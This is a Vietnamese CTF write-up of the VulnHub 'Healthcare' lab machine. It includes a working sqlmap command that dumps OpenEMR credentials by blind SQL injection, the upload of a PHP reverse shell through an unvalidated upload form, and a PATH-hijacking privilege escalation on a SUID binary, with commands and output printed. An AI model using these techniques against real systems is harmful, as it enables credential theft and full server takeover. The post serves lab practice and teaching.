---
title: Healthcare Writeup - VulnHub
date: "2023-07-28 01:11:07"
categories:
  - CTF Writeup
  - VulnHub
tags:
  - hacking

pin: true
---

Download [Healthcare VulnHub](https://www.vulnhub.com/entry/healthcare-1,522/){:target="\_blank"}.

## Enumeration

![Scan Ports](/posts/Healthcare/scan-ports.PNG)
_Scan Ports and Services_

```shell
gobuster dir -u http://10.0.2.9/ -w /usr/share/wordlists/Seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 30
```

![Gobuster](/posts/Healthcare/gobuster.png)
_Directory fuzzing_

![Openemr login page](/posts/Healthcare/openemr-login.PNG)
_Openemr login page_

## Exploitation

Đã biết ứng dụng đang chạy Openemr - một phần mềm mã nguồn mở, quản lý hành nghề y tế gì đó. Đặc biệt hơn, Openemr v4.1.0 chứa lỗ hổng unauthenticated blind SQL injection, có mã [CVE-2012-2115](https://www.cvedetails.com/cve/CVE-2012-2115/){:target="\_blank"}. Sau khi nhấn login, thông tin sẽ được xác thực qua `validateUser.php`. Nếu user tồn tại thì truy vấn sẽ luôn trả về ít nhất 1 hàng. Đồng nghĩa với việc ta có thể chèn payload SQL injection tại đây và thực hiện `Blind SQL Injection`.

Dùng `sqlmap` để khai thác:

```shell
┌──(kali㉿kali)-[~]
└─$ sqlmap -u '10.0.2.9/openemr/interface/login/validateUser.php?u=1' -D openemr -T users -C username,password --dump --batch
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.7.6#stable}
|_ -| . [(]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org


.................

Database: openemr
Table: users
[2 entries]
+----------+----------------------------------------------------+
| username | password                                           |
+----------+----------------------------------------------------+
| admin    | 2de89a0a37f4a62dc4fa04f2637efcbba098ab44           |
| medical  | ab24aed5a7c4ad45615cd7e0da816eea39e4895d (medical) |
+----------+----------------------------------------------------+

```

Dump được 2 entries như trên, do tools đã crackhash được pasword của user `medical` nên ta dùng tài khoản này để login vô openemr luôn.

![Openemr Interface](/posts/Healthcare/openemr-interface.PNG)
_Giao diện sau khi login Openemr_

## Remote Code Execution

Sau khi đã đặt chân vào trang quản trị của Openemr v4.1.0, chúng ta có thể khai thác vuln mới có mã [CVE-2011-5161](https://www.cvedetails.com/cve/CVE-2011-5161/){:target="\_blank"}, cho phép người dùng upload file bất kì và không có bất cứ validation nào. Điều này giúp chúng ta dễ dàng upload và chạy reverse shell.

Tìm thủ công nơi có thể upload file, khả năng nhất là nơi update thông tin của bệnh nhân/khách hàng. Tiến hành truy cập đến `Patient/Client`>`New/Search`.

![Create New Patient](/posts/Healthcare/create-new-patient.PNG)
_Tạo mới 1 Patient_

Sau khi tạo xong, search và click vào Patient vừa tạo. Sau đó di chuyển tới `Documents` > `Patient Information` > `Patient Photograph`

![Patient A](/posts/Healthcare/a.PNG)

![Upload Page](/posts/Healthcare/upload-page.PNG)

Yah chính nó! Upload reverse shell php lên, chạy file và tạo 1 port listener tại máy local:

![Upload Revshell](/posts/Healthcare/upload-revshell.PNG)

![RCE](/posts/Healthcare/rce.PNG)
_RCE thành công!_

## Privilege Escalation

```shell
find / -perm -u=s 2>/dev/null
```

```
...
...
/usr/bin/healthcheck
...
...
```

Tiến hành tìm kiếm file SUID thì phát hiện file nhị phân trông lạ lạ này. Kiểm tra tệp này 1 chút:

```shell
sh-4.1$ ls -la /usr/bin/healthcheck
-rwsr-sr-x 1 root root 5813 Jul 29  2020 /usr/bin/healthcheck
```

File nhị phân này chạy dưới quyền root. Tất cả chỉ là thực hiện kiểm tra, Scan hệ thống, ổ đĩa,...

```shell
sh-4.1$ strings /usr/bin/healthcheck
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
setuid
system
setgid
__libc_start_main
GLIBC_2.0
PTRhp
[^_]
clear ; echo 'System Health Check' ; echo '' ; echo 'Scanning System' ; sleep 2 ; ifconfig ; fdisk -l ; du -h
```

Hơn nữa, họ không chỉ định đường dẫn tuyệt đối cho các câu lệnh trong này => Ta có thể set PATH cho directory hiện tại và tạo file thực thi để spawn shell đồng thời trùng với 1 command nằm trong `healthcheck`. Thay vì chạy file bin trong PATH mặc định thì câu lệnh đó được chạy trong môi trường mà ta set cho PATH, tức file spawn shell của ta sẽ được gọi.

Trong file `healthcheck` có 1 vài câu lệnh, ta có thể chọn 1 lệnh bất kì trong số đó.

```shell
sh-4.1$ cd /tmp
sh-4.1$ export PATH=$(pwd):$PATH
sh-4.1$ echo "/bin/bash" > clear
```

```shell
sh-4.1$ healthcheck
TERM environment variable not set.
System Health Check

Scanning System
eth2      Link encap:Ethernet  HWaddr 08:00:27:54:37:D4
          inet addr:10.0.2.9  Bcast:10.0.2.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fe54:37d4/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1481565 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1576879 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:219434428 (209.2 MiB)  TX bytes:1884801187 (1.7 GiB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:160 errors:0 dropped:0 overruns:0 frame:0
          TX packets:160 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:17440 (17.0 KiB)  TX bytes:17440 (17.0 KiB)


id
uid=0(root) gid=0(root) groups=0(root),416(apache)
```

```shell
python -c 'import pty;pty.spawn("/bin/bash")'
[root@localhost tmp]# cd /
[root@localhost root]# ls
Desktop/    drakx/        healthcheck.c  sudo.rpm
Documents/  healthcheck*  root.txt       tmp/
[root@localhost root]# cat root.txt
Flag day ne: QnJlYWtUZWFtX0ZsYWdfWE5YWC5DT01fQWhpaGk=
[root@localhost root]# echo "QnJlYWtUZWFtX0ZsYWdfWE5YWC5DT01fQWhpaGk="| base64 -d
BreakTeam_Flag_XNXX.COM_Ahihi
```
